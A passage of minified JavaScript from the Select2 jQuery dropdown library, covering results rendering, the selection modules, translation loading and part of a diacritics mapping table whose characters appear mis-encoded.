n++) { var i = t.results[n], o = this.option(i); e.push(o) } this.$results.append(e) } else 0 === this.$results.children().length && this.trigger("results:message", { message: "noResults" }) }, i.prototype.position = function (t, e) { e.find(".select2-results").append(t) }, i.prototype.sort = function (t) { return this.options.get("sorter")(t) }, i.prototype.highlightFirstItem = function () { var t = this.$results.find(".select2-results__option[aria-selected]"), e = t.filter("[aria-selected=true]"); 0 < e.length ? e.first().trigger("mouseenter") : t.first().trigger("mouseenter"), this.ensureHighlightVisible() }, i.prototype.setClasses = function () { var e = this; this.data.current(function (t) { var i = u.map(t, function (t) { return t.id.toString() }); e.$results.find(".select2-results__option[aria-selected]").each(function () { var t = u(this), e = h.GetData(this, "data"), n = "" + e.id; null != e.element && e.element.selected || null == e.element && -1 < u.inArray(n, i) ? t.attr("aria-selected", "true") : t.attr("aria-selected", "false") }) }) }, i.prototype.showLoading = function (t) { this.hideLoading(); var e = { disabled: !0, loading: !0, text: this.options.get("translations").get("searching")(t) }, n = this.option(e); n.className += " loading-results", this.$results.prepend(n) }, i.prototype.hideLoading = function () { this.$results.find(".loading-results").remove() }, i.prototype.option = function (t) { var e = document.createElement("li"); e.className = "select2-results__option"; var n = { role: "treeitem", "aria-selected": "false" }; for (var i in t.disabled && (delete n["aria-selected"], n["aria-disabled"] = "true"), null == t.id && delete n["aria-selected"], null != t._resultId && (e.id = t._resultId), t.title && (e.title = t.title), t.children && (n.role = "group", n["aria-label"] = t.text, delete n["aria-selected"]), n) { var o = n[i]; e.setAttribute(i, o) } if (t.children) { var a = u(e), s = document.createElement("strong"); s.className = "select2-results__group", u(s), this.template(t, s); for (var r = [], g = 0; g < t.children.length; g++) { var l = t.children[g], c = this.option(l); r.push(c) } var I = u("<ul></ul>", { class: "select2-results__options select2-results__options--nested" }); I.append(r), a.append(s), a.append(I) } else this.template(t, e); return h.StoreData(e, "data", t), e }, i.prototype.bind = function (e, t) { var g = this, n = e.id + "-results"; this.$results.attr("id", n), e.on("results:all", function (t) { g.clear(), g.append(t.data), e.isOpen() && (g.setClasses(), g.highlightFirstItem()) }), e.on("results:append", function (t) { g.append(t.data), e.isOpen() && g.setClasses() }), e.on("query", function (t) { g.hideMessages(), g.showLoading(t) }), e.on("select", function () { e.isOpen() && (g.setClasses(), g.options.get("scrollAfterSelect") && g.highlightFirstItem()) }), e.on("unselect", function () { e.isOpen() && (g.setClasses(), g.options.get("scrollAfterSelect") && g.highlightFirstItem()) }), e.on("open", function () { g.$results.attr("aria-expanded", "true"), g.$results.attr("aria-hidden", "false"), g.setClasses(), g.ensureHighlightVisible() }), e.on("close", function () { g.$results.attr("aria-expanded", "false"), g.$results.attr("aria-hidden", "true"), g.$results.removeAttr("aria-activedescendant") }), e.on("results:toggle", function () { var t = g.getHighlightedResults(); 0 !== t.length && t.trigger("mouseup") }), e.on("results:select", function () { var t, e = g.getHighlightedResults(); 0 !== e.length && (t = h.GetData(e[0], "data"), "true" == e.attr("aria-selected") ? g.trigger("close", {}) : g.trigger("select", { data: t })) }), e.on("results:previous", function () { var t, e, n, i, o, a = g.getHighlightedResults(), s = g.$results.find("[aria-selected]"), r = s.index(a); r <= 0 || (t = r - 1, 0 === a.length && (t = 0), (e = s.eq(t)).trigger("mouseenter"), n = g.$results.offset().top, i = e.offset().top, o = g.$results.scrollTop() + (i - n), 0 === t ? g.$results.scrollTop(0) : i - n < 0 && g.$results.scrollTop(o)) }), e.on("results:next", function () { var t, e, n, i, o = g.getHighlightedResults(), a = g.$results.find("[aria-selected]"), s = a.index(o) + 1; s >= a.length || ((t = a.eq(s)).trigger("mouseenter"), e = g.$results.offset().top + g.$results.outerHeight(!1), n = t.offset().top + t.outerHeight(!1), i = g.$results.scrollTop() + n - e, 0 === s ? g.$results.scrollTop(0) : e < n && g.$results.scrollTop(i)) }), e.on("results:focus", function (t) { t.element.addClass("select2-results__option--highlighted") }), e.on("results:message", function (t) { g.displayMessage(t) }), u.fn.mousewheel && this.$results.on("mousewheel", function (t) { var e = g.$results.scrollTop(), n = g.$results.get(0).scrollHeight - e + t.deltaY, i = 0 < t.deltaY && e - t.deltaY <= 0, o = t.deltaY < 0 && n <= g.$results.height(); i ? (g.$results.scrollTop(0), t.preventDefault(), t.stopPropagation()) : o && (g.$results.scrollTop(g.$results.get(0).scrollHeight - g.$results.height()), t.preventDefault(), t.stopPropagation()) }), this.$results.on("mouseup", ".select2-results__option[aria-selected]", function (t) { var e = u(this), n = h.GetData(this, "data"); "true" !== e.attr("aria-selected") ? g.trigger("select", { originalEvent: t, data: n }) : g.options.get("multiple") ? g.trigger("unselect", { originalEvent: t, data: n }) : g.trigger("close", {}) }), this.$results.on("mouseenter", ".select2-results__option[aria-selected]", function (t) { var e = h.GetData(this, "data"); g.getHighlightedResults().removeClass("select2-results__option--highlighted"), g.trigger("results:focus", { data: e, element: u(this) }) }) }, i.prototype.getHighlightedResults = function () { return this.$results.find(".select2-results__option--highlighted") }, i.prototype.destroy = function () { this.$results.remove() }, i.prototype.ensureHighlightVisible = function () { var t, e, n, i, o, a = this.getHighlightedResults(); 0 !== a.length && (t = this.$results.find("[aria-selected]").index(a), e = this.$results.offset().top, n = a.offset().top, i = this.$results.scrollTop() + (n - e), o = n - e, i -= 2 * a.outerHeight(!1), t <= 2 ? this.$results.scrollTop(0) : (o > this.$results.outerHeight() || o < 0) && this.$results.scrollTop(i)) }, i.prototype.template = function (t, e) { var n = this.options.get("templateResult"), i = this.options.get("escapeMarkup"), o = n(t, e); null == o ? e.style.display = "none" : "string" == typeof o ? e.innerHTML = i(o) : u(e).append(o) }, i }), t.define("select2/keys", [], function () { return { BACKSPACE: 8, TAB: 9, ENTER: 13, SHIFT: 16, CTRL: 17, ALT: 18, ESC: 27, SPACE: 32, PAGE_UP: 33, PAGE_DOWN: 34, END: 35, HOME: 36, LEFT: 37, UP: 38, RIGHT: 39, DOWN: 40, DELETE: 46 } }), t.define("select2/selection/base", ["jquery", "../utils", "../keys"], function (n, i, o) { function a(t, e) { this.$element = t, this.options = e, a.__super__.constructor.call(this) } return i.Extend(a, i.Observable), a.prototype.render = function () { var t = n('<span class="select2-selection" role="combobox"  aria-haspopup="true" aria-expanded="false"></span>'); return this._tabindex = 0, null != i.GetData(this.$element[0], "old-tabindex") ? this._tabindex = i.GetData(this.$element[0], "old-tabindex") : null != this.$element.attr("tabindex") && (this._tabindex = this.$element.attr("tabindex")), t.attr("title", this.$element.attr("title")), t.attr("tabindex", this._tabindex), this.$selection = t }, a.prototype.bind = function (t, e) { var n = this, i = (t.id, t.id + "-results"); this.container = t, this.$selection.on("focus", function (t) { n.trigger("focus", t) }), this.$selection.on("blur", function (t) { n._handleBlur(t) }), this.$selection.on("keydown", function (t) { n.trigger("keypress", t), t.which === o.SPACE && t.preventDefault() }), t.on("results:focus", function (t) { n.$selection.attr("aria-activedescendant", t.data._resultId) }), t.on("selection:update", function (t) { n.update(t.data) }), t.on("open", function () { n.$selection.attr("aria-expanded", "true"), n.$selection.attr("aria-owns", i), n._attachCloseHandler(t) }), t.on("close", function () { n.$selection.attr("aria-expanded", "false"), n.$selection.removeAttr("aria-activedescendant"), n.$selection.removeAttr("aria-owns"), window.setTimeout(function () { n.$selection.focus() }, 0), n._detachCloseHandler(t) }), t.on("enable", function () { n.$selection.attr("tabindex", n._tabindex) }), t.on("disable", function () { n.$selection.attr("tabindex", "-1") }) }, a.prototype._handleBlur = function (t) { var e = this; window.setTimeout(function () { document.activeElement == e.$selection[0] || n.contains(e.$selection[0], document.activeElement) || e.trigger("blur", t) }, 1) }, a.prototype._attachCloseHandler = function (t) { n(document.body).on("mousedown.select2." + t.id, function (t) { var e = n(t.target).closest(".select2"); n(".select2.select2-container--open").each(function () { n(this), this != e[0] && i.GetData(this, "element").select2("close") }) }) }, a.prototype._detachCloseHandler = function (t) { n(document.body).off("mousedown.select2." + t.id) }, a.prototype.position = function (t, e) { e.find(".selection").append(t) }, a.prototype.destroy = function () { this._detachCloseHandler(this.container) }, a.prototype.update = function (t) { throw new Error("The `update` method must be defined in child classes.") }, a }), t.define("select2/selection/single", ["jquery", "./base", "../utils", "../keys"], function (t, e, n, i) { function o() { o.__super__.constructor.apply(this, arguments) } return n.Extend(o, e), o.prototype.render = function () { var t = o.__super__.render.call(this); return t.addClass("select2-selection--single"), t.html('<span class="select2-selection__rendered"></span><span class="select2-selection__arrow" role="presentation"><b role="presentation"></b></span>'), t }, o.prototype.bind = function (e, t) { var n = this; o.__super__.bind.apply(this, arguments); var i = e.id + "-container"; this.$selection.find(".select2-selection__rendered").attr("id", i).attr("role", "textbox").attr("aria-readonly", "true"), this.$selection.attr("aria-labelledby", i), this.$selection.on("mousedown", function (t) { 1 === t.which && n.trigger("toggle", { originalEvent: t }) }), this.$selection.on("focus", function (t) { }), this.$selection.on("blur", function (t) { }), e.on("focus", function (t) { e.isOpen() || n.$selection.focus() }) }, o.prototype.clear = function () { var t = this.$selection.find(".select2-selection__rendered"); t.empty(), t.removeAttr("title") }, o.prototype.display = function (t, e) { var n = this.options.get("templateSelection"); return this.options.get("escapeMarkup")(n(t, e)) }, o.prototype.selectionContainer = function () { return t("<span></span>") }, o.prototype.update = function (t) { var e, n, i; 0 !== t.length ? (e = t[0], n = this.$selection.find(".select2-selection__rendered"), i = this.display(e, n), n.empty().append(i), n.attr("title", e.title || e.text)) : this.clear() }, o }), t.define("select2/selection/multiple", ["jquery", "./base", "../utils"], function (o, t, r) { function n(t, e) { n.__super__.constructor.apply(this, arguments) } return r.Extend(n, t), n.prototype.render = function () { var t = n.__super__.render.call(this); return t.addClass("select2-selection--multiple"), t.html('<ul class="select2-selection__rendered"></ul>'), t }, n.prototype.bind = function (t, e) { var i = this; n.__super__.bind.apply(this, arguments), this.$selection.on("click", function (t) { i.trigger("toggle", { originalEvent: t }) }), this.$selection.on("click", ".select2-selection__choice__remove", function (t) { var e, n; i.options.get("disabled") || (e = o(this).parent(), n = r.GetData(e[0], "data"), i.trigger("unselect", { originalEvent: t, data: n })) }) }, n.prototype.clear = function () { var t = this.$selection.find(".select2-selection__rendered"); t.empty(), t.removeAttr("title") }, n.prototype.display = function (t, e) { var n = this.options.get("templateSelection"); return this.options.get("escapeMarkup")(n(t, e)) }, n.prototype.selectionContainer = function () { return o('<li class="select2-selection__choice"><span class="select2-selection__choice__remove" role="presentation">&times;</span></li>') }, n.prototype.update = function (t) { if (this.clear(), 0 !== t.length) { for (var e = [], n = 0; n < t.length; n++) { var i = t[n], o = this.selectionContainer(), a = this.display(i, o); o.append(a), o.attr("title", i.title || i.text), r.StoreData(o[0], "data", i), e.push(o) } var s = this.$selection.find(".select2-selection__rendered"); r.appendMany(s, e) } }, n }), t.define("select2/selection/placeholder", ["../utils"], function (t) { function e(t, e, n) { this.placeholder = this.normalizePlaceholder(n.get("placeholder")), t.call(this, e, n) } return e.prototype.normalizePlaceholder = function (t, e) { return "string" == typeof e && (e = { id: "", text: e }), e }, e.prototype.createPlaceholder = function (t, e) { var n = this.selectionContainer(); return n.html(this.display(e)), n.addClass("select2-selection__placeholder").removeClass("select2-selection__choice"), n }, e.prototype.update = function (t, e) { var n = 1 == e.length && e[0].id != this.placeholder.id; if (1 < e.length || n) return t.call(this, e); this.clear(); var i = this.createPlaceholder(this.placeholder); this.$selection.find(".select2-selection__rendered").append(i) }, e }), t.define("select2/selection/allowClear", ["jquery", "../keys", "../utils"], function (o, i, r) { function t() { } return t.prototype.bind = function (t, e, n) { var i = this; t.call(this, e, n), null == this.placeholder && this.options.get("debug") && window.console && console.error && console.error("Select2: The `allowClear` option should be used in combination with the `placeholder` option."), this.$selection.on("mousedown", ".select2-selection__clear", function (t) { i._handleClear(t) }), e.on("keypress", function (t) { i._handleKeyboardClear(t, e) }) }, t.prototype._handleClear = function (t, e) { if (!this.options.get("disabled")) { var n = this.$selection.find(".select2-selection__clear"); if (0 !== n.length) { e.stopPropagation(); var i = r.GetData(n[0], "data"), o = this.$element.val(); this.$element.val(this.placeholder.id); var a = { data: i }; if (this.trigger("clear", a), a.prevented) this.$element.val(o); else { for (var s = 0; s < i.length; s++)if (a = { data: i[s] }, this.trigger("unselect", a), a.prevented) return void this.$element.val(o); this.$element.trigger("change"), this.trigger("toggle", {}) } } } }, t.prototype._handleKeyboardClear = function (t, e, n) { n.isOpen() || e.which != i.DELETE && e.which != i.BACKSPACE || this._handleClear(e) }, t.prototype.update = function (t, e) { var n, i; t.call(this, e), 0 < this.$selection.find(".select2-selection__placeholder").length || 0 === e.length || (n = this.options.get("translations").get("removeAllItems"), i = o('<span class="select2-selection__clear" title="' + n() + '">&times;</span>'), r.StoreData(i[0], "data", e), this.$selection.find(".select2-selection__rendered").prepend(i)) }, t }), t.define("select2/selection/search", ["jquery", "../utils", "../keys"], function (i, s, r) { function t(t, e, n) { t.call(this, e, n) } return t.prototype.render = function (t) { var e = i('<li class="select2-search select2-search--inline"><input class="select2-search__field" type="search" tabindex="-1" autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false" role="textbox" aria-autocomplete="list" /></li>'); this.$searchContainer = e, this.$search = e.find("input"); var n = t.call(this); return this._transferTabIndex(), n }, t.prototype.bind = function (t, e, n) { var i = this; t.call(this, e, n), e.on("open", function () { i.$search.trigger("focus") }), e.on("close", function () { i.$search.val(""), i.$search.removeAttr("aria-activedescendant"), i.$search.trigger("focus") }), e.on("enable", function () { i.$search.prop("disabled", !1), i._transferTabIndex() }), e.on("disable", function () { i.$search.prop("disabled", !0) }), e.on("focus", function (t) { i.$search.trigger("focus") }), e.on("results:focus", function (t) { i.$search.attr("aria-activedescendant", t.id) }), this.$selection.on("focusin", ".select2-search--inline", function (t) { i.trigger("focus", t) }), this.$selection.on("focusout", ".select2-search--inline", function (t) { i._handleBlur(t) }), this.$selection.on("keydown", ".select2-search--inline", function (t) { var e, n; t.stopPropagation(), i.trigger("keypress", t), i._keyUpPrevented = t.isDefaultPrevented(), t.which !== r.BACKSPACE || "" !== i.$search.val() || 0 < (e = i.$searchContainer.prev(".select2-selection__choice")).length && (n = s.GetData(e[0], "data"), i.searchRemoveChoice(n), t.preventDefault()) }); var o = document.documentMode, a = o && o <= 11; this.$selection.on("input.searchcheck", ".select2-search--inline", function (t) { a ? i.$selection.off("input.search input.searchcheck") : i.$selection.off("keyup.search") }), this.$selection.on("keyup.search input.search", ".select2-search--inline", function (t) { var e; a && "input" === t.type ? i.$selection.off("input.search input.searchcheck") : (e = t.which) != r.SHIFT && e != r.CTRL && e != r.ALT && e != r.TAB && i.handleSearch(t) }) }, t.prototype._transferTabIndex = function (t) { this.$search.attr("tabindex", this.$selection.attr("tabindex")), this.$selection.attr("tabindex", "-1") }, t.prototype.createPlaceholder = function (t, e) { this.$search.attr("placeholder", e.text) }, t.prototype.update = function (t, e) { var n = this.$search[0] == document.activeElement; this.$search.attr("placeholder", ""), t.call(this, e), this.$selection.find(".select2-selection__rendered").append(this.$searchContainer), this.resizeSearch(), n && (this.$element.find("[data-select2-tag]").length ? this.$element.focus() : this.$search.focus()) }, t.prototype.handleSearch = function () { var t; this.resizeSearch(), this._keyUpPrevented || (t = this.$search.val(), this.trigger("query", { term: t })), this._keyUpPrevented = !1 }, t.prototype.searchRemoveChoice = function (t, e) { this.trigger("unselect", { data: e }), this.$search.val(e.text), this.handleSearch() }, t.prototype.resizeSearch = function () { this.$search.css("width", "25px"); var t = ""; t = "" !== this.$search.attr("placeholder") ? this.$selection.find(".select2-selection__rendered").innerWidth() : .75 * (this.$search.val().length + 1) + "em", this.$search.css("width", t) }, t }), t.define("select2/selection/eventRelay", ["jquery"], function (s) { function t() { } return t.prototype.bind = function (t, e, n) { var i = this, o = ["open", "opening", "close", "closing", "select", "selecting", "unselect", "unselecting", "clear", "clearing"], a = ["opening", "closing", "selecting", "unselecting", "clearing"]; t.call(this, e, n), e.on("*", function (t, e) { var n; -1 !== s.inArray(t, o) && (e = e || {}, n = s.Event("select2:" + t, { params: e }), i.$element.trigger(n), -1 !== s.inArray(t, a) && (e.prevented = n.isDefaultPrevented())) }) }, t }), t.define("select2/translation", ["jquery", "require"], function (e, n) { function i(t) { this.dict = t || {} } return i.prototype.all = function () { return this.dict }, i.prototype.get = function (t) { return this.dict[t] }, i.prototype.extend = function (t) { this.dict = e.extend({}, t.all(), this.dict) }, i._cache = {}, i.loadPath = function (t) { var e; return t in i._cache || (e = n(t), i._cache[t] = e), new i(i._cache[t]) }, i }), t.define("select2/diacritics", [], function () { return { "â¶": "A", "ï¼¡": "A", "Ã": "A", "Ã": "A", "Ã": "A", "áº¦": "A", "áº¤": "A", "áºª": "A", "áº¨": "A", "Ã": "A", "Ä": "A", "Ä": "A", "áº°": "A", "áº®": "A", "áº´": "A", "áº²": "A", "È¦": "A", "Ç ": "A", "Ã": "A", "Ç": "A", "áº¢": "A", "Ã": "A", "Çº": "A", "Ç": "A", "È": "A", "È": "A", "áº ": "A", "áº¬": "A", "áº¶": "A", "á¸": "A", "Ä": "A", "Èº": "A", "â±¯": "A", "ê²": "AA", "Ã": "AE", "Ç¼": "AE", "Ç¢": "AE", "ê´": "AO", "ê¶": "AU", "ê¸": "AV", "êº": "AV", "ê¼": "AY", "â·": "B", "ï¼¢": "B", "á¸": "B", "á¸": "B", "á¸": "B", "É": "B", "Æ": "B", "Æ": "B", "â¸": "C", "ï¼£": "C", "Ä": "C", "Ä": "C", "Ä": "C", "Ä": "C", "Ã": "C", "á¸": "C", "Æ": "C", "È»": "C", "ê¾": "C", "â¹": "D", "ï¼¤": "D", "á¸": "D", "Ä": "D", "á¸": "D", "á¸": "D", "á¸": "D", "á¸": "D", "Ä": "D", "Æ": "D", "Æ": "D", "Æ": "D", "ê¹": "D", "Ç±": "DZ", "Ç": "DZ", "Ç²": "Dz", "Ç": "Dz", "âº": "E", "ï¼¥": "E", "Ã": "E", "Ã": "E", "Ã": "E", "á»": "E", "áº¾": "E", "á»": "E", "á»": "E", "áº¼": "E", "Ä": "E", "á¸": "E", "á¸": "E", "Ä": "E", "Ä": "E", "Ã": "E", "áºº": "E", "Ä": "E", "È": "E", "È": "E", "áº¸": "E", "á»": "E", "È¨": "E", "á¸": "E", "Ä": "E", "á¸": "E", "á¸": "E", "Æ": "E", "Æ": "E", "â»": "F", "ï¼¦": "F", "á¸": "F", "Æ": "F", "ê»": "F", "â¼": "G", "ï¼§": "G", "Ç´": "G", "Ä": "G", "á¸ ": "G", "Ä": "G", "Ä ": "G", "Ç¦": "G", "Ä¢": "G", "Ç¤": "G", "Æ": "G", "ê ": "G", "ê½": "G", "ê¾": "G", "â½": "H", "ï¼¨": "H", "Ä¤": "H", "á¸¢": "H", "á¸¦": "H", "È": "H", "á¸¤": "H", "á¸¨": "H", "á¸ª": "H", "Ä¦": "H", "â±§": "H", "â±µ": "H", "ê": "H", "â¾": "I", "ï¼©": "I", "Ã": "I", "Ã": "I", "Ã": "I", "Ä¨": "I", "Äª": "I", "Ä¬": "I", "Ä°": "I", "Ã": "I", "á¸®": "I", "á»": "I", "Ç": "I", "È": "I", "È": "I", "á»": "I", "Ä®": "I", "á¸¬": "I", "Æ": "I", "â¿": "J", "ï¼ª": "J", "Ä´": "J", "É": "J", "â": "K", "ï¼«": "K", "á¸°": "K", "Ç¨": "K", "á¸²": "K", "Ä¶": "K", "á¸´": "K", "Æ": "K", "â±©": "K", "ê": "K", "ê": "K", "ê": "K", "ê¢": "K", "â": "L", "ï¼¬": "L", "Ä¿": "L", "Ä¹": "L", "Ä½": "L", "á¸¶": "L", "á¸¸": "L", "Ä»": "L", "á¸¼": "L", "á¸º": "L", "Å": "L", "È½": "L", "â±¢": "L", "â± ": "L", "ê": "L", "ê": "L", "ê": "L", "Ç": "LJ", "Ç": "Lj", "â": "M", "ï¼­": "M", "á¸¾": "M", "á¹": "M", "á¹": "M", "â±®": "M", "Æ": "M", "â": "N", "ï¼®": "N", "Ç¸": "N", "Å": "N", "Ã": "N", "á¹": "N", "Å": "N", "á¹": "N", "Å": "N", "á¹": "N", "á¹": "N", "È ": "N", "Æ": "N", "ê": "N", "ê¤": "N", "Ç": "NJ", "Ç": "Nj", "â": "O", "ï¼¯": "O", "Ã": "O", "Ã": "O", "Ã": "O", "á»": "O", "á»": "O", "á»": "O", "á»": "O", "Ã": "O", "á¹": "O", "È¬": "O", "á¹": "O", "Å": "O", "á¹": "O", "á¹": "O", "Å": "O", "È®": "O", "È°": "O", "Ã": "O", "Èª": "O", "á»": "O", "Å": "O", "Ç": "O", "È": "O", "È": "O", "Æ ": "O", "á»": "O", "á»": "O", "á» ": "O", "á»": "O", "á»¢": "O", "á»": "O", "á»": "O", "Çª": "O", "Ç¬": "O", "Ã": "O", "Ç¾": "O", "Æ": "O", "Æ": "O", "ê": "O", "ê": "O", "Å": "OE", "Æ¢": "OI", "ê": "OO", "È¢": "OU", "â": "P", "ï¼°": "P", "á¹": "P", "á¹": "P", "Æ¤": "P", "â±£": "P", "ê": "P", "ê": "P", "ê": "P", "â": "Q", "ï¼±": "Q", "ê": "Q", "ê": "Q", "É": "Q", "â": "R", "ï¼²": "R", "Å": "R", "á¹": "R", "Å": "R", "È": "R", "È": "R", "á¹": "R", "á¹": "R", "Å": "R", "á¹": "R", "É": "R", "â±¤": "R", "ê": "R", "ê¦": "R", "ê": "R", "â": "S", "ï¼³": "S", "áº": "S", "Å": "S", "á¹¤": "S", "Å": "S", "á¹ ": "S", "Å ": "S", "á¹¦": "S", "á¹¢": "S", "á¹¨": "S", "È": "S", "Å": "S", "â±¾": "S", "ê¨": "S", "ê": "S", "â": "T", "ï¼´": "T", "á¹ª": "T", "Å¤": "T", "á¹¬": "T", "È": "T", "Å¢": "T", "á¹°": "T", "á¹®": "T", "Å¦": "T", "Æ¬": "T", "Æ®": "T", "È¾": "T", "ê": "T", "ê¨": "TZ", "â": "U", "ï¼µ": "U", "Ã": "U", "Ã": "U", "Ã": "U", "Å¨": "U", "á¹¸": "U", "Åª": "U", "á¹º": "U", "Å¬": "U", "Ã": "U", "Ç": "U", "Ç": "U", "Ç": "U", "Ç": "U", "á»¦": "U", "Å®": "U", "Å°": "U", "Ç": "U", "È": "U", "È": "U", "Æ¯": "U", "á»ª": "U", "á»¨": "U", "á»®": "U", "á»¬": "U", "á»°": "U", "á»¤": "U", "á¹²": "U", "Å²": "U", "á¹¶": "U", "á¹´": "U", "É": "U", "â": "V", "ï¼¶": "V", "á¹¼": "V", "á¹¾": "V", "Æ²": "V", "ê": "V", "É": "V", "ê ": "VY", "â": "W", "ï¼·": "W", "áº": "W", "áº": "W", "Å´": "W", "áº": "W", "áº": "W", "áº": "W", "â±²": "W", "â": "X", "ï¼¸": "X", "áº": "X", "áº": "X", "â": "Y", "ï¼¹": "Y", "á»²": "Y", "Ã": "Y", "Å¶": "Y", "á»¸": "Y", "È²": "Y", "áº": "Y", "Å¸": "Y", "á»¶": "Y", "á»´": "Y", "Æ³": "Y", "É": "Y", "á»¾": "Y", "â": "Z", "ï¼º": "Z", "Å¹": "Z", "áº": "Z", "Å»": "Z", "Å½": "Z", "áº": "Z", "áº": "Z", "Æµ": "Z", "È¤": "Z", "â±¿": "Z", "â±«": "Z", "ê¢": "Z", "â": "a", "ï½": "a", "áº": "a", "Ã ": "a", "Ã¡": "a", "Ã¢": "a", "áº§": "a", "áº¥": "a", "áº«": "a", "áº©": "a", "Ã£": "a", "Ä": "a", "Ä": "a", "áº±": "a", "áº¯": "a", "áºµ": "a", "áº³": "a", "È§": "a", "Ç¡": "a", "Ã¤": "a", "Ç": "a", "áº£": "a", "Ã¥": "a", "Ç»": "a", "Ç": "a", "È": "a", "È": "a", "áº¡": "a", "áº­": "a", "áº·": "a", "á¸": "a", "Ä": "a", "â±¥": "a", "É": "a", "ê³": "aa", "Ã¦": "ae", "Ç½": "ae", "Ç£": "ae", "êµ": "ao", "ê·": "au", "ê¹": "av", "ê»": "av", "ê½": "ay", "â": "b", "ï½": "b", "á¸": "b", "á¸": "b", "á¸": "b", "Æ": "b", "Æ": "b", "É": "b", "â": "c", "ï½": "c", "Ä": "c", "Ä": "c", "Ä": "c", "Ä": "c", "Ã§": "c", "á¸": "c", "Æ": "c", "È¼": "c", "ê¿": "c", "â": "c", "â": "d", "ï½": "d", "á¸": "d", "Ä": "d", "á¸": "d", "á¸": "d", "á¸": "d", "á¸": "d", "Ä": "d", "Æ": "d", "É": "d", "É": "d", "êº": "d", "Ç³": "dz", "Ç": "dz", "â": "e", "ï½": "e", "Ã¨": "e", "Ã©": "e", "Ãª": "e", "á»": "e", "áº¿": "e", "á»": "e", "á»": "e", "áº½": "e", "Ä": "e", "á¸": "e", "á¸": "e", "Ä": "e", "Ä": "e", "Ã«": "e", "áº»": "e", "Ä": "e", "È": "e", "È": "e", "áº¹": "e", "á»": "e", "È©": "e", "á¸": "e", "Ä": "e", "á¸": "e", "á¸": "e", "É": "e", "É": "e", "Ç": "e", "â": "f", "ï½": "f", "á¸": "f", "Æ": "f", "ê¼": "f", "â": "g", "ï½": "g", "Çµ": "g", "Ä": "g", "á¸¡": "g", "Ä": "g", "Ä¡": "g", "Ç§": "g", "Ä£": "g", "Ç¥": "g", "É ": "g", "ê¡": "g", "áµ¹": "g", "ê¿": "g", "â": "h", "ï½": "h", "Ä¥": "h", "á¸£": "h", "á¸§": "h", "È": "h", "á¸¥": "h", "á¸©": "h", "á¸«": "h", "áº": "h", "Ä§": "h", "â±¨": "h", "â±¶": "h", "É¥": "h", "Æ": "hv", "â": "i", "ï½": "i", "Ã¬": "i", "Ã­": "i", "Ã®": "i", "Ä©": "i", "Ä«": "i", "Ä­": "i", "Ã¯": "i", "á¸¯": "i", "á»": "i", "Ç": "i", "È": "i", "È": "i", "á»": "i", "Ä¯": "i", "á¸­": "i", "É¨": "i", "Ä±": "i", "â": "j", "ï½": "j", "Äµ": "j", "Ç°": "j", "É": "j", "â": "k", "ï½": "k", "á¸±": "k", "Ç©": "k", "á¸³": "k", "Ä·": "k", "á¸µ": "k", "Æ": "k", "â±ª": "k", "ê": "k", "ê": "k", "ê": "k", "ê£": "k", "â": "l", "ï½": "l", "Å": "l", "Äº": "l", "Ä¾": "l", "á¸·": "l", "á¸¹": "l", "Ä¼": "l", "á¸½": "l", "á¸»": "l", "Å¿": "l", "Å": "l", "Æ": "l", "É«": "l", "â±¡": "l", "ê": "l", "ê": "l", "ê": "l", "Ç": "lj", "â": "m", "ï½": "m", "á¸¿": "m", "á¹": "m", "á¹": "m", "É±": "m", "É¯": "m", "â": "n", "ï½": "n", "Ç¹": "n", "Å": "n", "Ã±": "n", "á¹": "n", "Å": "n", "á¹": "n", "Å": "n", "á¹": "n", "á¹": "n", "Æ": "n", "É²": "n", "Å": "n", "ê": "n", "ê¥": "n", "Ç": "nj", "â": "o", "ï½": "o", "Ã²": "o", "Ã³": "o", "Ã´": "o", "á»": "o", "á»": "o", "á»": "o", "á»": "o", "Ãµ": "o", "á¹": "o", "È­": "o", "á¹": "o", "Å": "o", "á¹": "o", "á¹": "o", "Å": "o", "È¯": "o", "È±": "o", "Ã¶": "o", "È«": "o", "á»": "o", "Å": "o", "Ç": "o", "È": "o", "È": "o", "Æ¡": "o", "á»": "o", "á»": "o", "á»¡": "o", "á»": "o", "á»£": "o", "á»": "o", "á»": "o", "Ç«": "o", "Ç­": "o", "Ã¸": "o", "Ç¿": "o", "É": "o", "ê": "o", "ê": "o", "Éµ": "o", "Å": "oe", "Æ£": "oi", "È£": "ou", "ê": "oo", "â": "p", "ï½": "p", "á¹": "p", "á¹": "p", "Æ¥": "p", "áµ½": "p", "ê": "p", "ê": "p", "ê": "p", "â ": "q", "ï½": "q", "É": "q", "ê": "q", "ê": "q", "â¡": "r", "ï½": "r", "Å": "r", "á¹": "r", "Å": "r", "È": "r", "È": "r", "á¹": "r", "á¹": "r", "Å": "r", "á¹": "r", "É": "r", "É½": "r", "ê": "r", "ê§": "r", "ê": "r", "â¢": "s", "ï½": "s", "Ã": "s", "Å": "s", "á¹¥": "s", "Å": "s", "á¹¡": "s", "Å¡": "s", "á¹§": "s", "á¹£": "s", "á¹©": "s", "È": "s", "Å": "s", "È¿": "s", "ê©": "s", "ê": "s", "áº": "s", "â£": "t", "ï½": "t", "á¹«": "t", "áº": "t", "Å¥": "t", "á¹­": "t", "È": "t", "Å£": "t", "á¹±": "t", "á¹¯": "t", "Å§": "t", "Æ­": "t", "Ê": "t", "â±¦": "t", "ê": "t", "ê©": "tz", "â¤": "u", "ï½": "u", "Ã¹": "u", "Ãº": "u", "Ã»": "u", "Å©": "u", "á¹¹": "u", "Å«": "u", "á¹»": "u", "Å­": "u", "Ã¼": "u", "Ç": "u", "Ç": "u", "Ç": "u", "Ç": "u", "á»§": "u", "Å¯": "u", "Å±": "u", "Ç": "u", "È": "u", "È": "u", "Æ°": "u", "á»«": "u", "á»©": "u", "á»¯": "u", "á»­": "u", "á»±": "u", "á»¥": "u", "á¹³": "u", "Å³": "u", "á¹·": "u", "á¹µ": "u", "Ê": "u", "â¥": "v", "ï½": "v", "á¹½": "v", "á¹¿": "v", "Ê": "v", "ê": "v", "Ê": "v", "ê¡": "vy", "â¦": "w", "ï½": "w", "áº": "w", "áº": "w", "Åµ": "w", "áº": "w", "áº": "w", "áº": "w", "áº": "w", "â±³": "w", "â§": "x", "ï½": "x", "áº": "x", "áº": "x", "â¨": "y", "ï½": "y", "á»³": "y", "Ã½": "y", "Å·": "y", "á»¹": "y", "È³": "y", "áº": "y", "Ã¿": "y", "á»·": "y", "áº": "y", "á»µ": "y", "Æ´": "y", "É": "y", "á»¿": "y", "â©": "z", "ï½": "z", "Åº": "z", "áº": "z", "Å¼": "z", "Å¾": "z", "áº": "z", "áº": "z", "Æ¶": "z", "È¥": "z", "É": "z", "â±¬": "z", 